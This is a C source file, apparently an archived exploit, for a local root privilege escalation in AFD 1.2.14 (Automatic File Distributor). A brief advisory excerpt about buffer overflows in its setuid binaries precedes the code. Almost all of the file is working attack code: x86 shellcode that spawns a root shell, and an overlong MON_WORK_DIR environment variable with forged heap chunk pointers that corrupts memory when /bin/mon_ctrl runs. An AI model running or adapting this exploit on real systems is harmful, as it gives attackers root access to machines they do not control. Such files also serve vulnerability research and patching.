/*
source: http://www.securityfocus.com/bid/5626/info
 
AFD (Automatic File Distributor) is prone to a number of locally exploitable stack and heap based buffer overflow conditions. These issues are all related to insufficient bounds checking of externally supplied values for the working directory, either via the command line or through an environment variable.
 
A number of the vulnerable AFD binaries are installed setuid root and may potentially be exploited by a local attacker to execute arbitrary code as root. 
*/
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] =
    "\xeb\x0a" /* 10-byte-jump; setreuid(0,0); execve /bin/sh; exit(0); */
    "--netric--"
    "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f"
    "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d"
    "\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

int
main(int argc, char *argv[])
{
    char buffer[1135];

    unsigned int retloc     = 0xbfffe360;
    unsigned int ret        = 0x0806f020; /* &shellcode */

    if (argc > 1) retloc = strtoul(argv[1], &argv[1], 16);
    if (argc > 2) ret    = strtoul(argv[2], &argv[2], 16);

    memset(buffer, 0x41, sizeof(buffer));
    memcpy(buffer, "MON_WORK_DIR=",13);
    memcpy(buffer+13, shellcode, strlen(shellcode));

    buffer[1117] = 0xff; /* prev_size */
    buffer[1118] = 0xff;
    buffer[1119] = 0xff;
    buffer[1120] = 0xff;

    buffer[1121] = 0xfc; /* size field */
    buffer[1122] = 0xff;
    buffer[1123] = 0xff;
    buffer[1124] = 0xff;

    buffer[1126] = (retloc & 0x000000ff); /* FD */
    buffer[1127] = (retloc & 0x0000ff00) >> 8;
    buffer[1128] = (retloc & 0x00ff0000) >> 16;
    buffer[1129] = (retloc & 0xff000000) >> 24;

    buffer[1130] = (ret & 0x000000ff); /* BK */
    buffer[1131] = (ret & 0x0000ff00) >> 8;
    buffer[1132] = (ret & 0x00ff0000) >> 16;
    buffer[1133] = (ret & 0xff000000) >> 24;

    buffer[1134] = 0x0;
    putenv(buffer);

    fprintf(stdout, "AFD 1.2.14 local root exploit by eSDee of Netric (www.netric.org)\n");
    fprintf(stdout, "-----------------------------------------------------------------\n");
    fprintf(stdout, "Ret    = 0x%08x\n", ret);
    fprintf(stdout, "Retloc = 0x%08x\n", retloc);

    execl("/bin/mon_ctrl", "mon_ctrl", NULL);
    return 0;
}